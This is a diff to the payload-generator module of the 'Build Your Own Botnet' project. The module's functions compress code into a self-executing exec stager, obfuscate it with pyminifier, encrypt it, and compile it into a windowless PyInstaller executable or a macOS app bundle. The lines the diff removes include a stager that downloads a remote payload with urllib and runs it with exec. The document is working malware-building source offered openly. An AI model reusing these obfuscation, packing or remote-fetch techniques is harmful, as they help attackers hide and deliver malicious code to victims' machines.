@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Code Generators (Build Your Own Botnet)'
+'Build Your Own Botnet'
 
 # standard library
 import os
@@ -18,6 +18,7 @@ import util
 import security
 
 # globals
+
 __Template_main  = """
 if __name__ == '__main__':
     _{0} = {1}({2})
@@ -30,25 +31,25 @@ __Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
 <key>CFBundleDevelopmentRegion</key>
 <string>English</string>
 <key>CFBundleExecutable</key>
-<string>%s</string>
+<string>{0}</string>
 <key>CFBundleGetInfoString</key>
-<string>%s</string>
+<string>{1}</string>
 <key>CFBundleIconFile</key>
-<string>%s</string>
+<string>{2}</string>
 <key>CFBundleIdentifier</key>
-<string>%s</string>
+<string>{3}</string>
 <key>CFBundleInfoDictionaryVersion</key>
 <string>6.0</string>
 <key>CFBundleName</key>
-<string>%s</string>
+<string>{4}</string>
 <key>CFBundlePackageType</key>
 <string>APPL</string>
 <key>CFBundleShortVersionString</key>
-<string>%s</string>
+<string>{5}</string>
 <key>CFBundleSignature</key>
 <string>????</string>
 <key>CFBundleVersion</key>
-<string>%s</string>
+<string>{6}</string>
 <key>NSAppleScriptEnabled</key>
 <string>YES</string>
 <key>NSMainNibFile</key>
@@ -58,13 +59,14 @@ __Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
 </dict>
 </plist>
 """
+
 __Template_spec = """# -*- mode: python -*-
-block_cipher = pyi_crypto.PyiBlockCipher(key='[128_BIT_KEY]')
-a = Analysis(['[PY_FILE]'],
-             pathex=['[DIST_PATH]'],
+block_cipher = pyi_crypto.PyiBlockCipher(key={0})
+a = Analysis([{1}],
+             pathex=[{2}],
              binaries=[],
              datas=[],
-             hiddenimports=[HIDDEN_IMPORTS],
+             hiddenimports={3},
              hookspath=[],
              runtime_hooks=[],
              excludes=['site'],
@@ -78,44 +80,47 @@ exe = EXE(pyz,
           a.binaries,
           a.zipfiles,
           a.datas,
-          name='[NAME]',
+          name={4},
           debug=False,
           strip=False,
           upx=False,
           runtime_tmpdir=None,
-          console=False, icon='[ICON_PATH]')
+          console=False, icon={5})
 """
 
 
 # main
-def compress(input, url=False):
+def compress(input):
     """ 
     Zip-compress output into self-executing script
+
+    `Requires`
+    :param str input:    input code to compress
 
     Returns compressed output as a string
 
     """
-    return "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9)))) if not url else "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(input))
+    return "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))
 
 def obfuscate(input):
     """ 
     Obfuscate and minimize memory footprint of output
 
     `Requires`
-    :param str output:    output to obfuscate
+    :param str input:    input code to obfuscate
 
     Returns obfuscated output as a string
 
     """
-    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
     if os.path.isfile(input):
         input = open(input, 'r').read()
+    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
     temp.file.write(input)
     temp.file.close()
     name = os.path.join(tempfile.gettempdir(), temp.name)
     obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     obfs.wait()
-    output = open(name, 'r').read()
+    output = open(name, 'r').read().strip('# Created by pyminifier (https://github.com/liftoff/pyminifier)')
     os.remove(name)
     return output
 
@@ -125,9 +130,12 @@ def encrypt(input, key):
     and 128-bit key
 
     `Requires`
-    :param str output:    output to obfuscate
+    :param str input:    input code to encrypt
+    :param str key:      128-bit encryption key
+                         (may be base64-encoded)
 
-    Returns obfuscated output as a string
+    Returns encrypted output as a string
+    
     """
     try:
         key = base64.b64decode(key)
@@ -142,17 +150,13 @@ def variable(length=6):
     :param int length:    length of the variable name to generate
 
     Returns variable as a string
+    
     """
     return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
 
 def snippet(template='main', function='main', *args, **kwargs):
     """ 
     Generate a output snippet using the given template
-
-    `Templates`
-        - main:  
-                if __name__ == '__main__':
-                     _function = Function(*args, **kwargs)   
 
     `Required`
     :param str template:    name of template
@@ -202,17 +206,7 @@ def exe(filename, icon=None):
         except:
             raise Exception("missing package 'PyInstaller' is required to compile .py into a standalone executable binary")
         make = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
-        if globals()['_debug']:
-            while True:
-                if make.poll():
-                    try:
-                        util.display(make.stdout.readline())
-                    except:
-                        pass
-                else:
-                    break
-        else:
-            make.wait()
+        make.wait()
         if not make.returncode == 0:
             raise Exception("failed to compile executable: {}".format(str().join((make.communicate()))))
         exe   = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
